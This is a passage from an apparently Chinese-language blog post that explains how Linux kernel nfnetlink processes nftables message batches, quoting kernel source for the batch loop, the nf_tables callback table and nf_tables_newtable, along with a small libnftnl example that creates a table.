class="line"></span><br><span class="line">nfnl_unlock(subsys_id);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (skb-&gt;len &gt;= nlmsg_total_size(<span class="number">0</span>)) &#123;</span><br><span class="line"><span class="keyword">int</span> msglen, type;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (fatal_signal_pending(current)) &#123;</span><br><span class="line">nfnl_err_reset(&amp;err_list);</span><br><span class="line">err = -EINTR;</span><br><span class="line">status = NFNL_BATCH_FAILURE;</span><br><span class="line"><span class="keyword">goto</span> done;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(&amp;extack, <span class="number">0</span>, <span class="keyword">sizeof</span>(extack));</span><br><span class="line">nlh = nlmsg_hdr(skb);</span><br><span class="line">err = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nlh-&gt;nlmsg_len &lt; NLMSG_HDRLEN ||</span><br><span class="line">    skb-&gt;len &lt; nlh-&gt;nlmsg_len ||</span><br><span class="line">    nlmsg_len(nlh) &lt; <span class="keyword">sizeof</span>(struct nfgenmsg)) &#123;</span><br><span class="line">nfnl_err_reset(&amp;err_list);</span><br><span class="line">status |= NFNL_BATCH_FAILURE;</span><br><span class="line"><span class="keyword">goto</span> done;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Only requests are handled by the kernel */</span></span><br><span class="line"><span class="keyword">if</span> (!(nlh-&gt;nlmsg_flags &amp; NLM_F_REQUEST)) &#123;</span><br><span class="line">err = -EINVAL;</span><br><span class="line"><span class="keyword">goto</span> ack;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">type = nlh-&gt;nlmsg_type;</span><br><span class="line"><span class="keyword">if</span> (type == NFNL_MSG_BATCH_BEGIN) &#123;</span><br><span class="line"><span class="comment">/* Malformed: Batch begin twice */</span></span><br><span class="line">nfnl_err_reset(&amp;err_list);</span><br><span class="line">status |= NFNL_BATCH_FAILURE;</span><br><span class="line"><span class="keyword">goto</span> done;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == NFNL_MSG_BATCH_END) &#123;</span><br><span class="line">status |= NFNL_BATCH_DONE;</span><br><span class="line"><span class="keyword">goto</span> done;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (type &lt; NLMSG_MIN_TYPE) &#123;</span><br><span class="line">err = -EINVAL;</span><br><span class="line"><span class="keyword">goto</span> ack;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* We only accept a batch with messages for the same</span></span><br><span class="line"><span class="comment"> * subsystem.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (NFNL_SUBSYS_ID(type) != subsys_id) &#123;</span><br><span class="line">err = -EINVAL;</span><br><span class="line"><span class="keyword">goto</span> ack;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">nc = nfnetlink_find_client(type, ss);</span><br><span class="line"><span class="keyword">if</span> (!nc) &#123;</span><br><span class="line">err = -EINVAL;</span><br><span class="line"><span class="keyword">goto</span> ack;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> min_len = nlmsg_total_size(<span class="keyword">sizeof</span>(struct nfgenmsg));</span><br><span class="line">u8 cb_id = NFNL_MSG_TYPE(nlh-&gt;nlmsg_type);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">cda</span>[<span class="title">NFNL_MAX_ATTR_COUNT</span> + 1];</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">attr</span> =</span> (<span class="keyword">void</span> *)nlh + min_len;</span><br><span class="line"><span class="keyword">int</span> attrlen = nlh-&gt;nlmsg_len - min_len;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Sanity-check NFTA_MAX_ATTR */</span></span><br><span class="line"><span class="keyword">if</span> (ss-&gt;cb[cb_id].attr_count &gt; NFNL_MAX_ATTR_COUNT) &#123;</span><br><span class="line">err = -ENOMEM;</span><br><span class="line"><span class="keyword">goto</span> ack;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">err = nla_parse(cda, ss-&gt;cb[cb_id].attr_count, attr,</span><br><span class="line">attrlen, ss-&gt;cb[cb_id].policy, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> ack;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nc-&gt;call_batch) &#123;</span><br><span class="line">err = nc-&gt;call_batch(net, net-&gt;nfnl, skb, nlh,</span><br><span class="line">     (<span class="keyword">const</span> struct nlattr **)cda,</span><br><span class="line">     &amp;extack);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* The lock was released to autoload some module, we</span></span><br><span class="line"><span class="comment"> * have to abort and start from scratch using the</span></span><br><span class="line"><span class="comment"> * original skb.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (err == -EAGAIN) &#123;</span><br><span class="line">status |= NFNL_BATCH_REPLAY;</span><br><span class="line"><span class="keyword">goto</span> done;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">ack:</span><br><span class="line"><span class="keyword">if</span> (nlh-&gt;nlmsg_flags &amp; NLM_F_ACK || err) &#123;</span><br><span class="line"><span class="comment">/* Errors are delivered once the full batch has been</span></span><br><span class="line"><span class="comment"> * processed, this avoids that the same error is</span></span><br><span class="line"><span class="comment"> * reported several times when replaying the batch.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (nfnl_err_add(&amp;err_list, nlh, err, &amp;extack) &lt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="comment">/* We failed to enqueue an error, reset the</span></span><br><span class="line"><span class="comment"> * list of errors and send OOM to userspace</span></span><br><span class="line"><span class="comment"> * pointing to the batch header.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">nfnl_err_reset(&amp;err_list);</span><br><span class="line">netlink_ack(oskb, nlmsg_hdr(oskb), -ENOMEM,</span><br><span class="line">    <span class="literal">NULL</span>);</span><br><span class="line">status |= NFNL_BATCH_FAILURE;</span><br><span class="line"><span class="keyword">goto</span> done;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* We don&#x27;t stop processing the batch on errors, thus,</span></span><br><span class="line"><span class="comment"> * userspace gets all the errors that the batch</span></span><br><span class="line"><span class="comment"> * triggers.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line">status |= NFNL_BATCH_FAILURE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">msglen = NLMSG_ALIGN(nlh-&gt;nlmsg_len);</span><br><span class="line"><span class="keyword">if</span> (msglen &gt; skb-&gt;len)</span><br><span class="line">msglen = skb-&gt;len;</span><br><span class="line">skb_pull(skb, msglen);</span><br><span class="line">&#125;</span><br><span class="line">done:</span><br><span class="line"><span class="keyword">if</span> (status &amp; NFNL_BATCH_REPLAY) &#123;</span><br><span class="line">ss-&gt;<span class="built_in">abort</span>(net, oskb);</span><br><span class="line">nfnl_err_reset(&amp;err_list);</span><br><span class="line">kfree_skb(skb);</span><br><span class="line">module_put(ss-&gt;owner);</span><br><span class="line"><span class="keyword">goto</span> replay;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (status == NFNL_BATCH_DONE) &#123;</span><br><span class="line">err = ss-&gt;commit(net, oskb);</span><br><span class="line"><span class="keyword">if</span> (err == -EAGAIN) &#123;</span><br><span class="line">status |= NFNL_BATCH_REPLAY;</span><br><span class="line"><span class="keyword">goto</span> done;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (err) &#123;</span><br><span class="line">ss-&gt;<span class="built_in">abort</span>(net, oskb);</span><br><span class="line">netlink_ack(oskb, nlmsg_hdr(oskb), err, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">ss-&gt;<span class="built_in">abort</span>(net, oskb);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (ss-&gt;cleanup)</span><br><span class="line">ss-&gt;cleanup(net);</span><br><span class="line"></span><br><span class="line">nfnl_err_deliver(&amp;err_list, oskb);</span><br><span class="line">kfree_skb(skb);</span><br><span class="line">module_put(ss-&gt;owner);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先通过</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ss = nfnl_dereference_protected(subsys_id);</span><br></pre></td></tr></table></figure><p>取出<code>subsys_id</code>对应的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NFNL_SUBSYS_NONE 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NFNL_SUBSYS_CTNETLINK1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NFNL_SUBSYS_CTNETLINK_EXP2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NFNL_SUBSYS_QUEUE3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NFNL_SUBSYS_ULOG4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NFNL_SUBSYS_OSF5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NFNL_SUBSYS_IPSET6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NFNL_SUBSYS_ACCT7</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NFNL_SUBSYS_CTNETLINK_TIMEOUT8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NFNL_SUBSYS_CTHELPER9</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NFNL_SUBSYS_NFTABLES10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NFNL_SUBSYS_NFT_COMPAT11</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NFNL_SUBSYS_HOOK12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NFNL_SUBSYS_COUNT13</span></span><br></pre></td></tr></table></figure><p>这里我们对<code>nftables</code>进行操作那就很明显是0xa</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">const</span> struct nfnl_callback *</span></span><br><span class="line"><span class="function"><span class="title">nfnetlink_find_client</span><span class="params">(u16 type, <span class="keyword">const</span> struct nfnetlink_subsystem *ss)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">u8 cb_id = NFNL_MSG_TYPE(type);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (cb_id &gt;= ss-&gt;cb_count)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> &amp;ss-&gt;cb[cb_id];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在获得<code>subsystem</code>之后就会进入上面的函数，拿到对应的客户端</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nfnetlink_subsystem</span> <span class="title">nf_tables_subsys</span> =</span> &#123;</span><br><span class="line">    .name       = <span class="string">&quot;nf_tables&quot;</span>,</span><br><span class="line">    .subsys_id  = NFNL_SUBSYS_NFTABLES,</span><br><span class="line">    .cb_count   = NFT_MSG_MAX,</span><br><span class="line">    .cb     = nf_tables_cb,</span><br><span class="line">    .commit     = nf_tables_commit,</span><br><span class="line">    .<span class="built_in">abort</span>      = nf_tables_abort,</span><br><span class="line">    .cleanup    = nf_tables_cleanup,</span><br><span class="line">    .valid_genid    = nf_tables_valid_genid,</span><br><span class="line">    .owner      = THIS_MODULE,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nfnl_callback</span> <span class="title">nf_tables_cb</span>[<span class="title">NFT_MSG_MAX</span>] =</span> &#123;</span><br><span class="line">[NFT_MSG_NEWTABLE] = &#123;</span><br><span class="line">.call_batch= nf_tables_newtable,</span><br><span class="line">.attr_count= NFTA_TABLE_MAX,</span><br><span class="line">.policy= nft_table_policy,</span><br><span class="line">&#125;,</span><br><span class="line">[NFT_MSG_GETTABLE] = &#123;</span><br><span class="line">.call_rcu= nf_tables_gettable,</span><br><span class="line">.attr_count= NFTA_TABLE_MAX,</span><br><span class="line">.policy= nft_table_policy,</span><br><span class="line">&#125;,</span><br><span class="line">[NFT_MSG_DELTABLE] = &#123;</span><br><span class="line">.call_batch= nf_tables_deltable,</span><br><span class="line">.attr_count= NFTA_TABLE_MAX,</span><br><span class="line">.policy= nft_table_policy,</span><br><span class="line">&#125;,</span><br><span class="line">[NFT_MSG_NEWCHAIN] = &#123;</span><br><span class="line">.call_batch= nf_tables_newchain,</span><br><span class="line">.attr_count= NFTA_CHAIN_MAX,</span><br><span class="line">.policy= nft_chain_policy,</span><br><span class="line">&#125;,</span><br><span class="line">[NFT_MSG_GETCHAIN] = &#123;</span><br><span class="line">.call_rcu= nf_tables_getchain,</span><br><span class="line">.attr_count= NFTA_CHAIN_MAX,</span><br><span class="line">.policy= nft_chain_policy,</span><br><span class="line">&#125;,</span><br><span class="line">[NFT_MSG_DELCHAIN] = &#123;</span><br><span class="line">.call_batch= nf_tables_delchain,</span><br><span class="line">.attr_count= NFTA_CHAIN_MAX,</span><br><span class="line">.policy= nft_chain_policy,</span><br><span class="line">&#125;,</span><br><span class="line">[NFT_MSG_NEWRULE] = &#123;</span><br><span class="line">.call_batch= nf_tables_newrule,</span><br><span class="line">.attr_count= NFTA_RULE_MAX,</span><br><span class="line">.policy= nft_rule_policy,</span><br><span class="line">&#125;,</span><br><span class="line">[NFT_MSG_GETRULE] = &#123;</span><br><span class="line">.call_rcu= nf_tables_getrule,</span><br><span class="line">.attr_count= NFTA_RULE_MAX,</span><br><span class="line">.policy= nft_rule_policy,</span><br><span class="line">&#125;,</span><br><span class="line">[NFT_MSG_DELRULE] = &#123;</span><br><span class="line">.call_batch= nf_tables_delrule,</span><br><span class="line">.attr_count= NFTA_RULE_MAX,</span><br><span class="line">.policy= nft_rule_policy,</span><br><span class="line">&#125;,</span><br><span class="line">[NFT_MSG_NEWSET] = &#123;</span><br><span class="line">.call_batch= nf_tables_newset,</span><br><span class="line">.attr_count= NFTA_SET_MAX,</span><br><span class="line">.policy= nft_set_policy,</span><br><span class="line">&#125;,</span><br><span class="line">[NFT_MSG_GETSET] = &#123;</span><br><span class="line">.call_rcu= nf_tables_getset,</span><br><span class="line">.attr_count= NFTA_SET_MAX,</span><br><span class="line">.policy= nft_set_policy,</span><br><span class="line">&#125;,</span><br><span class="line">[NFT_MSG_DELSET] = &#123;</span><br><span class="line">.call_batch= nf_tables_delset,</span><br><span class="line">.attr_count= NFTA_SET_MAX,</span><br><span class="line">.policy= nft_set_policy,</span><br><span class="line">&#125;,</span><br><span class="line">[NFT_MSG_NEWSETELEM] = &#123;</span><br><span class="line">.call_batch= nf_tables_newsetelem,</span><br><span class="line">.attr_count= NFTA_SET_ELEM_LIST_MAX,</span><br><span class="line">.policy= nft_set_elem_list_policy,</span><br><span class="line">&#125;,</span><br><span class="line">[NFT_MSG_GETSETELEM] = &#123;</span><br><span class="line">.call_rcu= nf_tables_getsetelem,</span><br><span class="line">.attr_count= NFTA_SET_ELEM_LIST_MAX,</span><br><span class="line">.policy= nft_set_elem_list_policy,</span><br><span class="line">&#125;,</span><br><span class="line">[NFT_MSG_DELSETELEM] = &#123;</span><br><span class="line">.call_batch= nf_tables_delsetelem,</span><br><span class="line">.attr_count= NFTA_SET_ELEM_LIST_MAX,</span><br><span class="line">.policy= nft_set_elem_list_policy,</span><br><span class="line">&#125;,</span><br><span class="line">[NFT_MSG_GETGEN] = &#123;</span><br><span class="line">.call_rcu= nf_tables_getgen,</span><br><span class="line">&#125;,</span><br><span class="line">[NFT_MSG_NEWOBJ] = &#123;</span><br><span class="line">.call_batch= nf_tables_newobj,</span><br><span class="line">.attr_count= NFTA_OBJ_MAX,</span><br><span class="line">.policy= nft_obj_policy,</span><br><span class="line">&#125;,</span><br><span class="line">[NFT_MSG_GETOBJ] = &#123;</span><br><span class="line">.call_rcu= nf_tables_getobj,</span><br><span class="line">.attr_count= NFTA_OBJ_MAX,</span><br><span class="line">.policy= nft_obj_policy,</span><br><span class="line">&#125;,</span><br><span class="line">[NFT_MSG_DELOBJ] = &#123;</span><br><span class="line">.call_batch= nf_tables_delobj,</span><br><span class="line">.attr_count= NFTA_OBJ_MAX,</span><br><span class="line">.policy= nft_obj_policy,</span><br><span class="line">&#125;,</span><br><span class="line">[NFT_MSG_GETOBJ_RESET] = &#123;</span><br><span class="line">.call_rcu= nf_tables_getobj,</span><br><span class="line">.attr_count= NFTA_OBJ_MAX,</span><br><span class="line">.policy= nft_obj_policy,</span><br><span class="line">&#125;,</span><br><span class="line">[NFT_MSG_NEWFLOWTABLE] = &#123;</span><br><span class="line">.call_batch= nf_tables_newflowtable,</span><br><span class="line">.attr_count= NFTA_FLOWTABLE_MAX,</span><br><span class="line">.policy= nft_flowtable_policy,</span><br><span class="line">&#125;,</span><br><span class="line">[NFT_MSG_GETFLOWTABLE] = &#123;</span><br><span class="line">.call_rcu= nf_tables_getflowtable,</span><br><span class="line">.attr_count= NFTA_FLOWTABLE_MAX,</span><br><span class="line">.policy= nft_flowtable_policy,</span><br><span class="line">&#125;,</span><br><span class="line">[NFT_MSG_DELFLOWTABLE] = &#123;</span><br><span class="line">.call_batch= nf_tables_delflowtable,</span><br><span class="line">.attr_count= NFTA_FLOWTABLE_MAX,</span><br><span class="line">.policy= nft_flowtable_policy,</span><br><span class="line">&#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>上述<code>nfnetlink_subsystem</code>结构体中<code>cb</code>成员即客户端，再看对应的<code>nf_tables_cb</code>针对不同的操作定义了多个回调客户端，例如<code>NEWTABLE、NEW_CHAIN</code>之类的操作。</p><h3 id="创建table操作"><a href="#创建table操作" class="headerlink" title="创建table操作"></a>创建table操作</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint8_t</span> family = NFPROTO_IPV4;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nftnl_table</span> *<span class="title">table</span> =</span> nftnl_table_alloc();</span><br><span class="line">nftnl_table_set_str(table, NFTNL_TABLE_NAME, table_name);</span><br><span class="line">nftnl_table_set_u32(table, NFTNL_TABLE_FLAGS, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mnl_nlmsg_batch</span> *<span class="title">batch</span> =</span> mnl_nlmsg_batch_start(buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line"><span class="keyword">int</span> seq = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);</span><br><span class="line">mnl_nlmsg_batch_next(batch);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> *<span class="title">nlh</span>;</span></span><br><span class="line"><span class="keyword">int</span> table_seq = seq;</span><br><span class="line"></span><br><span class="line">nlh = nftnl_table_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWTABLE, family, NLM_F_CREATE | NLM_F_ACK, seq++);</span><br><span class="line">nftnl_table_nlmsg_build_payload(nlh, table);</span><br><span class="line">nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);</span><br><span class="line">mnl_nlmsg_batch_next(batch);</span><br><span class="line"><span class="keyword">if</span> (nl == <span class="literal">NULL</span>)</span><br><span class="line">  errExit(<span class="number">1</span>, <span class="string">&quot;mnl_socket_open&quot;</span>);</span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),</span><br><span class="line">                          mnl_nlmsg_batch_size(batch)) &lt; <span class="number">0</span>)</span><br><span class="line">  err(<span class="number">1</span>, <span class="string">&quot;mnl_socket_send&quot;</span>);</span><br></pre></td></tr></table></figure><p>上面就是生成一个<code>table</code>的小🌰。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (nc-&gt;call_batch) &#123;</span><br><span class="line">  err = nc-&gt;call_batch(net, net-&gt;nfnl, skb, nlh,</span><br><span class="line">                       (<span class="keyword">const</span> struct nlattr **)cda,</span><br><span class="line">                       &amp;extack);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在内核中会调用客户端对应的<code>call_batch</code>成员，这里创建<code>table</code>对应的就是<code>nf_tables_newtable</code>函数了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nf_tables_newtable</span><span class="params">(struct net *net, struct sock *nlsk,</span></span></span><br><span class="line"><span class="params"><span class="function">      struct sk_buff *skb, <span class="keyword">const</span> struct nlmsghdr *nlh,</span></span></span><br><span class="line"><span class="params"><span class="function">      <span class="keyword">const</span> struct nlattr * <span class="keyword">const</span> nla[],</span></span></span><br><span class="line"><span class="params"><span class="function">      struct netlink_ext_ack *extack)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nfgenmsg</span> *<span class="title">nfmsg</span> =</span> nlmsg_data(nlh);</span><br><span class="line">u8 genmask = nft_genmask_next(net);</span><br><span class="line"><span class="keyword">int</span> family = nfmsg-&gt;nfgen_family;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">attr</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_table</span> *<span class="title">table</span>;</span></span><br><span class="line">u32 flags = <span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_ctx</span> <span class="title">ctx</span>;</span></span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">lockdep_assert_held(&amp;net-&gt;nft.commit_mutex);</span><br><span class="line">attr = nla[NFTA_TABLE_NAME];</span><br><span class="line">table = nft_table_lookup(net, attr, family, genmask);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(table)) &#123;</span><br><span class="line"><span class="keyword">if</span> (PTR_ERR(table) != -ENOENT)</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(table);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (nlh-&gt;nlmsg_flags &amp; NLM_F_EXCL) &#123;</span><br><span class="line">NL_SET_BAD_ATTR(extack, attr);</span><br><span class="line"><span class="keyword">return</span> -EEXIST;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (nlh-&gt;nlmsg_flags &amp; NLM_F_REPLACE)</span><br><span class="line"><span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line"></span><br><span class="line">nft_ctx_init(&amp;ctx, net, skb, nlh, family, table, <span class="literal">NULL</span>, nla);</span><br><span class="line"><span class="keyword">return</span> nf_tables_updtable(&amp;ctx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_TABLE_FLAGS]) &#123;</span><br><span class="line">flags = 